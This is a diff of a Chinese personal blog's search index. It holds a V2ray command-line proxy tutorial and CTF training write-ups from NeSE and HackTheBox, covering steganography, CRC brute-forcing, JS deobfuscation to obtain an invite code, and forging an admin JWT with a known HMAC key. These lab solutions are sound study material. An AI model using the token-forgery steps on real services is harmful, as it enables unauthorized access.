-<p>我手上有很多外网的代理链接，但是很可惜的是这些并不是我自己的VPS服务器；且在我本身linux服务器不带用图形界面，因此无法使用ssr和v2rayN等简洁的代理服务。</p>
-<p>因此，如何在只有命令行的条件下将已有的代理链接变成v2ray客户端配置并访问外网即是本文的主要内容。</p>
-<h3 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h3><p>选择一个已有的代理，获取V2ray的订阅链接。</p>
-<p>这个链接是一个订阅的url，直接在浏览器输入后，即可下载订阅链接的txt文件。</p>
-<p>打开之后是一个base64编码的内容，直接解码。</p>
-<p><a href="/images/image-20211205225346933.png" title="image-20211205225346933" class="gallery-item"><img src="/images/image-20211205225346933.png" alt="image-20211205225346933"></a></p>
-<p>可以看到有vmess:&#x2F;&#x2F;开头的base64内容，如果选择继续解码，你会得到一个json字段，如图。</p>
-<p><a href="/images/image-20211205225721126.png" title="image-20211205225721126" class="gallery-item"><img src="/images/image-20211205225721126.png" alt="image-20211205225721126"></a></p>
-<p>用这些字段确实可以根据v2ray客户端配置的格式补充得到配置文件，但是过于麻烦。</p>
-<p>我们直接将vmess:&#x2F;&#x2F;的内容复制到windows上的v2rayN里面，然后选择“导出所选服务器为服务端配置”。</p>
-<p><a href="/images/image-20211205230049835.png" title="image-20211205230049835" class="gallery-item"><img src="/images/image-20211205230049835.png" alt="image-20211205230049835"></a></p>
-<p>然后将这个配置文件上传到我们的linux服务器上即可，启动时带上-config参数导入配置文件。（linux的V2ray相关配置可以看之前的文章）</p>
-<p><code>v2ray -config /usr/local/etc/v2ray/v2ray.json </code></p>
-<p><a href="/images/image-20211205230342197.png" title="image-20211205230342197" class="gallery-item"><img src="/images/image-20211205230342197.png" alt="image-20211205230342197"></a></p>
-<p>可以看到V2ray已经正常启动。</p>
-<p>接下来需要在另一个命令行窗口中将流量转发到1080端口即可实现代理，输入命令行。</p>
-<p><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
-<p><code>export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
-<blockquote>
-<p>注意：该代理只作用在当前终端窗口，不会影响服务器环境</p>
-</blockquote>
-<h3 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 效果"></a>0x02 效果</h3><p><a href="/images/image-20211205231153326.png" title="image-20211205231153326" class="gallery-item"><img src="/images/image-20211205231153326.png" alt="image-20211205231153326"></a></p>
-<p>命令行代理已经实现，接下来即可开始实现TG爬虫功能了</p>
-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-      <categories>
-        <category>Daily</category>
-      </categories>
-      <tags>
-        <tag>Daily life</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NeSE丙队5月月赛训练</title>
-    <url>/2021/05/29/NeSE%E4%B8%99%E9%98%9F5%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-嗷呜"><a href="#0x00-嗷呜" class="headerlink" title="0x00 嗷呜"></a>0x00 嗷呜</h4><p>简单查一下，兽音加密，直接 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a> 输入内容，得到一串01数组</p>
-<p>01数组共841位，简单的29*29，估计是二维码，简单处理一下</p>
-<p>代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from zlib import *</span><br><span class="line"></span><br><span class="line">MAX = 29</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str =&quot;1111111011000110100000111111110000010010001110001001000001101110100101101001001010111011011101010100000001000101110110111010101000000110001011101100000101011100010110010000011111111010101010101010111111100000000100001011101100000000100010111010010001011111110010111110011000110101001011010101000010001010001110000101101001001000110001001100001010010111101001111111110101010000000111101101100000000101011001110111101101011100000000011011001000100101101110010110101100001010100111000101010000011110101001000011011000011101010010111001001000111011000110100011000000100100111101111010111100101000011110101111110100000000010010000011010001010111111110110011110010101011001100000100100010110011000110001011101011101100000111111010110111010011001101011110000010101110100001001011000100011111000001000001000011111100101111111110110010111011110101010&quot;</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for y in range(0,MAX):</span><br><span class="line">    for x in range(0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0,0,0))</span><br><span class="line">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+    <title>HacktheBox注册挑战</title>
+    <url>/2021/03/13/HacktheBox%E6%B3%A8%E5%86%8C%E6%8C%91%E6%88%98/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="HacktheBox注册挑战"><a href="#HacktheBox注册挑战" class="headerlink" title="HacktheBox注册挑战"></a>HacktheBox注册挑战</h3><p>HacktheBox是一个在线靶场，近期准备考OSCP，准备拿靶场练练手。</p>
+<p>HacktheBox的注册有一定的门槛，在这里记录一下解决过程。</p>
+<p><a href="/images/20210313162402.png" title="注册页面1" class="gallery-item"><img src="/images/20210313162402.png" alt="注册页面1"></a></p>
+<p>点击HACK YOUR WAY IN</p>
+<p><a href="/images/20210313162502.png" title="注册页面2" class="gallery-item"><img src="/images/20210313162502.png" alt="注册页面2"></a></p>
+<p>在注册页面首先需要输入code，我们先看hint，点击Click Here</p>
+<p><a href="/images/20210313162644.png" title="注册码线索" class="gallery-item"><img src="/images/20210313162644.png" alt="注册码线索"></a></p>
+<p>提示我们需要检测console</p>
+<p>打开控制台，看到这样的信息</p>
+<a href="/images/20210313162823.png" title="console信息" class="gallery-item"><img src="/images/20210313162823.png" alt="console信息" style="zoom: 67%;" /></a>
 
-<p><a href="/images/qpQNZDAvgS82I8ZQZ730rA.png" class="gallery-item"><img src="/images/qpQNZDAvgS82I8ZQZ730rA.png"></a></p>
-<p>flag{we_mia0_mia0_t0gether}</p>
-<h4 id="0x01-crypto-0range"><a href="#0x01-crypto-0range" class="headerlink" title="0x01 crypto_0range"></a>0x01 crypto_0range</h4><p>过于简单的签到题</p>
-<p>base64解第一行：523641</p>
-<p>第二行看前6位出现flag{的标志，直接重新排序即可得到flag{crypto_is_magical!}</p>
-<h4 id="0X02-ultra-combine"><a href="#0X02-ultra-combine" class="headerlink" title="0X02 ultra_combine"></a>0X02 ultra_combine</h4><p>1.png 无法打开，但是可以直接用Stegsolve.jar查看，文件长宽500*359，CRC32值为0x2ca75026，直接上代码爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc = open(&quot;1.png&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">	data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">	if crc32 == 0x2ca75026: #IHDR块的crc32值</span><br><span class="line">		print(i)</span><br><span class="line">		print(&quot;hex:&quot;+hex(i))</span><br><span class="line"></span><br><span class="line"># 爆破高		</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data = misc[12:20] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 == 0x2ca75026:</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot;+hex(i))</span><br></pre></td></tr></table></figure>
+<p>提示我们需要找一个有趣的js文件，进入sources下的page查看调用的js文件，找到一个带有注释的js，提示我们这个js可能被混淆了</p>
+<a href="/images/20210313163055.png" title="js文件" class="gallery-item"><img src="/images/20210313163055.png" alt="js文件" style="zoom:67%;" /></a>
 
-<p>得到长宽应该为500*396，进入010editor修改，得到图1完整图片</p>
-<p><a href="/images/LBKQmvHn6GNC0Ua4AyfRdg.png" class="gallery-item"><img src="/images/LBKQmvHn6GNC0Ua4AyfRdg.png"></a></p>
-<p>2.zip压缩包需要密码，先猜测是伪加密，直接winrar修复文件，拿到图片。查看EXIF信息，得到如下数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名: 2.jpg</span><br><span class="line">图片大小: 120.2KB</span><br><span class="line">修改日期: 2021/05/06 00:30:26</span><br><span class="line">图片信息: 500x500 (Jpeg,YUV444)</span><br><span class="line">软件: 2is-AllHailUltra0</span><br><span class="line">艺术家: Meitu</span><br><span class="line">拍摄日期: 2021/04/10 16:24:51</span><br><span class="line">评论: &#123;&quot;Version&quot;:&quot;1.0.0&quot;,&quot;BeautyInfo&quot;:&#123;&quot;IsAIBeauty&quot;:false,&quot;IsOldBeauty&quot;:false,&quot;IsSkinColour&quot;:false,&quot;SwitchMedicatedAcne&quot;:false,&quot;IsBrightEyes&quot;:false,&quot;IsReduceBlackEyes&quot;:false,&quot;IsSharpen&quot;:false&#125;,&quot;FaceliftInfo&quot;:&#123;&quot;IsChangeFacelift&quot;:false,&quot;IsChangeThinFace&quot;:false,&quot;IsChangeEyeLift&quot;:false,&quot;IsChangeFaceChin&quot;:false,&quot;IsChangeNose&quot;:false,&quot;IsChangeMouth&quot;:false&#125;,&quot;FilterInfo&quot;:&#123;&quot;IsUseFilter&quot;:false&#125;,&quot;ARInfo&quot;:&#123;&quot;IsUseAR&quot;:false&#125;,&quot;MakeupInfo&quot;:&#123;&quot;IsUseMakeup&quot;:false&#125;,&quot;HandlerInfo&quot;:&#123;&quot;AppName&quot;:2&#125;,&quot;SoftHairInfo&quot;:&#123;&quot;IsUseSoftHair&quot;:false&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这个js的内容为eval类型的混淆，经过代码格式化后，eval中function的内容如下</p>
+<a href="/images/20210313163251.png" title="js中function代码" class="gallery-item"><img src="/images/20210313163251.png" alt="js中function代码" style="zoom:50%;" /></a>
 
-<p>比较显著的信息是软件名2is-AllHailUltra0</p>
-<p>12.zip是个真实加密的压缩包，看名字应该是1.png得到的信息和2.zip得到的信息结合，经过测试压缩密码为M78AllHailUltra0，解压得到一个无后缀文件12</p>
-<p>010editor查看12文件二进制格式，具备IHDR和IEND，且文件头格式为PNG文件格式，将后缀改成.png，发现无法打开。继续查看，发现一开始的8950被改成了8059，修改回去之后得到png图片</p>
-<p><a href="/images/MDslJlbMsu_eKha41WrT8A.png" class="gallery-item"><img src="/images/MDslJlbMsu_eKha41WrT8A.png"></a></p>
-<p>得到flag{Easy_Combine_for_Best_Hikari}</p>
-<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x03-cryptobmp"><a href="#0x03-cryptobmp" class="headerlink" title="0x03 cryptobmp"></a>0x03 cryptobmp</h4><p>一道隐写题，为啥会放在加密里面？</p>
-<p>打开result.bmp图片，可以在图片中央隐约看出存在内容信息</p>
-<p>上Stegsolve.jar看图片信息和各信道信息，没有结果</p>
-<p>色盲图一样的信息，感觉需要用颜色XOR把中间内容提取出来，打开010editor，将重复的信息提取出来，然后重复填充进后面的内容，保留最后一块和文件大小不变</p>
-<p><a href="/images/JgoJIbhRzZJmgFQ9RleA3g.png" class="gallery-item"><img src="/images/JgoJIbhRzZJmgFQ9RleA3g.png"></a></p>
-<p>用Stegsolve.jar异或叠加图片得到flag{c7FHe110n006}</p>
-<p><a href="/images/7AyLv1btjbin34I_aZEXYQ.png" class="gallery-item"><img src="/images/7AyLv1btjbin34I_aZEXYQ.png"></a></p>
-<h2 id="unsolved"><a href="#unsolved" class="headerlink" title="unsolved"></a>unsolved</h2><h4 id="0x04-IFDEMSKOIVB"><a href="#0x04-IFDEMSKOIVB" class="headerlink" title="0x04 IFDEMSKOIVB"></a>0x04 IFDEMSKOIVB</h4><p>标题和正文内容都经过加密或者编码</p>
-<p>看正文内容只包含数字{2-7}字母{A-Z}推测加密为base32，解密标题为</p>
-<p>AFFINECTF</p>
-<p>看上去是仿射加密，但是缺少仿射公式，正文内容也无法用base32解密，也不能用”flag{“去逆推，暂时卡住了</p>
-<p>将正文按照出现频次最高的7G分隔，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7GATL5FR7W2W7KQIF3CDLQVAYS</span><br><span class="line">7G7DCDSDVQ7D5LSG2QZXVY</span><br><span class="line">7G6TF5KJ7KGG56VKED</span><br></pre></td></tr></table></figure>
+<p>包含6个参数，并且给了参数的内容</p>
+<p>这边给出两种解混淆的方案</p>
+<ul>
+<li>直接查找反混淆网站，因为是eval类型，反混淆比较容易<ul>
+<li>eval类型的js反混淆网站：<a href="https://www.bm8.com.cn/jsConfusion/">https://www.bm8.com.cn/jsConfusion/</a></li>
+</ul>
+</li>
+<li>vs运行一遍，在最后return p的地方下一个断点，直接查看p的内容<ul>
+<li><a href="/images/20210313171250.png" title="vs调试" class="gallery-item"><img src="/images/20210313171250.png" alt="vs调试"></a></li>
+</ul>
+</li>
+</ul>
+<p>最后得到eval的执行内容</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>按照7和G对应RFC4648的值a&#x3D;31和b&#x3D;6进行仿射加密和解密，将仿射结果用base32解密，失败</p>
-<hr>
-<p>看了wp，说是爆破标题的<code>IFDEMSKOIVBVIRQ</code>和<code>7GATL5FR7W2W7KQ</code>得出仿射参数a和b</p>
-<p>黑人问号？？？你这最后一个Q一看就没仿射啊</p>
+<p>根据执行内容要求我们用POST访问&#x2F;api&#x2F;invite&#x2F;how&#x2F;to&#x2F;generate</p>
+<p>用hackbar执行（或者postman）</p>
+<a href="/images/20210313164219.png" title="how-to-generate" class="gallery-item"><img src="/images/20210313164219.png" alt="how-to-generate" style="zoom: 67%;" /></a>
+
+<p>得到如图json内容，该内容可能会改变为ROT13解密方式，但结果应该是一致的</p>
+<p>复制data内容，用hackbar解base64内容</p>
+<a href="/images/20210313164520.png" title="hackbar解base64" class="gallery-item"><img src="/images/20210313164520.png" alt="hackbar解base64" style="zoom:67%;" /></a>
+
+<p>提示我们需要再用post访问&#x2F;api&#x2F;invite&#x2F;generate</p>
+<p>访问获取json内容为</p>
+<p><a href="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" title="注册码code1" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" alt="注册码code1"></a></p>
+<p>很容易看出这是base64，重复上述操作，用hackbar解密base64内容得到注册码（该注册码是动态变化的）</p>
+<p><code>JBIXF-QDULC-CEBFM-OTBAW-DKHYP</code></p>
+<p>填入之后就可以注册了</p>
 </div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
@@ -547,8 +528,8 @@
         <category>Security</category>
       </categories>
       <tags>
+        <tag>Study life</tag>
         <tag>CTF</tag>
-        <tag>NeSE</tag>
       </tags>
   </entry>
   <entry>
@@ -703,6 +684,169 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux服务器利用V2ray访问外网（命令行）</title>
+    <url>/2021/12/10/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8V2ray%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Linux服务器利用V2ray访问外网（命令行）"><a href="#Linux服务器利用V2ray访问外网（命令行）" class="headerlink" title="Linux服务器利用V2ray访问外网（命令行）"></a>Linux服务器利用V2ray访问外网（命令行）</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>在用go-cqhttp+flask框架实现自定义QQ机器人功能时，想要利用爬虫获取TG机器人的相关发布内容，面临的首个问题就是服务器需要访问外网。</p>
+<p>我手上有很多外网的代理链接，但是很可惜的是这些并不是我自己的VPS服务器；且在我本身linux服务器不带用图形界面，因此无法使用ssr和v2rayN等简洁的代理服务。</p>
+<p>因此，如何在只有命令行的条件下将已有的代理链接变成v2ray客户端配置并访问外网即是本文的主要内容。</p>
+<h3 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h3><p>选择一个已有的代理，获取V2ray的订阅链接。</p>
+<p>这个链接是一个订阅的url，直接在浏览器输入后，即可下载订阅链接的txt文件。</p>
+<p>打开之后是一个base64编码的内容，直接解码。</p>
+<p><a href="/images/image-20211205225346933.png" title="image-20211205225346933" class="gallery-item"><img src="/images/image-20211205225346933.png" alt="image-20211205225346933"></a></p>
+<p>可以看到有vmess:&#x2F;&#x2F;开头的base64内容，如果选择继续解码，你会得到一个json字段，如图。</p>
+<p><a href="/images/image-20211205225721126.png" title="image-20211205225721126" class="gallery-item"><img src="/images/image-20211205225721126.png" alt="image-20211205225721126"></a></p>
+<p>用这些字段确实可以根据v2ray客户端配置的格式补充得到配置文件，但是过于麻烦。</p>
+<p>我们直接将vmess:&#x2F;&#x2F;的内容复制到windows上的v2rayN里面，然后选择“导出所选服务器为服务端配置”。</p>
+<p><a href="/images/image-20211205230049835.png" title="image-20211205230049835" class="gallery-item"><img src="/images/image-20211205230049835.png" alt="image-20211205230049835"></a></p>
+<p>然后将这个配置文件上传到我们的linux服务器上即可，启动时带上-config参数导入配置文件。（linux的V2ray相关配置可以看之前的文章）</p>
+<p><code>v2ray -config /usr/local/etc/v2ray/v2ray.json </code></p>
+<p><a href="/images/image-20211205230342197.png" title="image-20211205230342197" class="gallery-item"><img src="/images/image-20211205230342197.png" alt="image-20211205230342197"></a></p>
+<p>可以看到V2ray已经正常启动。</p>
+<p>接下来需要在另一个命令行窗口中将流量转发到1080端口即可实现代理，输入命令行。</p>
+<p><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<p><code>export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<blockquote>
+<p>注意：该代理只作用在当前终端窗口，不会影响服务器环境</p>
+</blockquote>
+<h3 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 效果"></a>0x02 效果</h3><p><a href="/images/image-20211205231153326.png" title="image-20211205231153326" class="gallery-item"><img src="/images/image-20211205231153326.png" alt="image-20211205231153326"></a></p>
+<p>命令行代理已经实现，接下来即可开始实现TG爬虫功能了</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>]]></content>
+      <categories>
+        <category>Daily</category>
+      </categories>
+      <tags>
+        <tag>Daily life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队1月月赛训练</title>
+    <url>/2021/01/22/NeSE%E4%B8%99%E9%98%9F1%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-misc1"><a href="#0x00-misc1" class="headerlink" title="0x00 misc1"></a>0x00 misc1</h4><p>签到题</p>
+<p>直接下载png文件，打开是一个二维码，直接扫码得到</p>
+<p>flag{B1ue_Bing0}</p>
+<h4 id="0x01-stego"><a href="#0x01-stego" class="headerlink" title="0x01 stego"></a>0x01 stego</h4><p>下载文件stego.png</p>
+<p>打开是一个放假通知，用binwalk查看内容</p>
+<p><a href="/images/20210125095532.png" title="image-20210125095532" class="gallery-item"><img src="/images/20210125095532.png" alt="image-20210125095532"></a></p>
+<p>可以得到这个png含有zip文件，根据图种特点，直接修改后缀.zip，有一个文件名为1的文件，直接打开得到</p>
+<p>flag{ez_z1p_st3g0}</p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x02-admin"><a href="#0x02-admin" class="headerlink" title="0x02 admin"></a>0x02 admin</h4><p>跳转进入网页显示不是admin，无法获取flag</p>
+<p>利用burpsuite抓包看到jwt_token，格式为{header}.{payload}.{verify signature}</p>
+<p>前两个用base64解密，得到header&#x3D;{“alg”:”HS256”,”type”:”JWT”}，payload&#x3D;{“user”:”tourist”} <del>大概是这样，忘记了</del></p>
+<p>jwt_token后面跟着key&#x3D;blueNeSE，verify signature的验证的公式为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  key</span><br><span class="line">) </span><br></pre></td></tr></table></figure>
+
+<p>通过jwt网站<a href="https://jwt.io/%E8%AE%A1%E7%AE%97%E9%AA%8C%E8%AF%81key%E7%A1%AE%E5%AE%9E%E4%B8%BAblueNeSE%EF%BC%8C%E6%9B%B4%E6%94%B9payload%E4%B8%BA%7B%22user%22:%22admin%22%7D%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%9A%84jwt_token">https://jwt.io/计算验证key确实为blueNeSE，更改payload为{&quot;user&quot;:&quot;admin&quot;}，自动生成验证的jwt_token</a></p>
+<p>修改jwt_token重放包，得到flag<del>忘了</del></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x03-jefferson-wheel"><a href="#0x03-jefferson-wheel" class="headerlink" title="0x03 jefferson wheel"></a>0x03 jefferson wheel</h4><p>加密表为</p>
+<p>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;</p>
+<p>根据密钥[5-9-14-13-1-7-2-12-4-10-6-3-11-15-8]，重组加密表，得到新表为</p>
+<p>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;</p>
+<p>根据密文[Q-J-K-B-P-P-X-D-G-G-F-T-V-U-G]，转动新表得到</p>
+<p>QWXYIHFRLABEUOTSGJVDKZPMNC<br>JXPLTDSRFGENYVUBMCQWAOIKZH<br>KQDLOEJPCNFXBIWZGRYMTVHSUA<br>BGTYHNUMKILOPJZQAWVXCDERFS<br>PNTCRMOSFYZWAXJGDLUBVIQHKE<br>PYBXIZULVKSRAFDCEONJQGWTHM<br>XMJQOYHGVSFUWIKPBRLNACZDTE<br>DFHGLVNCMXZPQOWEJURYTASBKI<br>GFCUKTEBSXQYIZMJWAORPLHDVN<br>GVRSTZQKELMXYIHPUDNAJFBOWC<br>FZDRUSLOQXVETAMKGHBWPNYCJI<br>TEQGYXPLOCKBDMAIZVNHSJUWFR<br>VBXZQWERTPOIUYALSKDJFHGMNC<br>UBFJSXOWAYGNEIDZTMHCRQKPVL<br>GHBQNOZUTWDCVRJLXKISYFAPME</p>
+<p>根据语义，最后一列为flag{chasemeincircle}<del>忘了是大写还是小写</del></p>
+<h4 id="0x04-广播"><a href="#0x04-广播" class="headerlink" title="0x04 广播"></a>0x04 广播</h4><p>下载broadcast.zip和hint.txt</p>
+<p>zip压缩文件内容加密，根据hint.txt得知密码为18位，且是简单的编码方式</p>
+<p>猜测关键词为broadcast，共9位，推测为十六进制编码（十进制会产生1位数对3位数，base64则是1位对4&#x2F;3位）</p>
+<p>利用62726f616463617374解压成功，得到{c3 c2 c1 n3 n2 n1}，根据题目也可以看出为RSA广播攻击</p>
+<p>编写对应的代码如下</p>
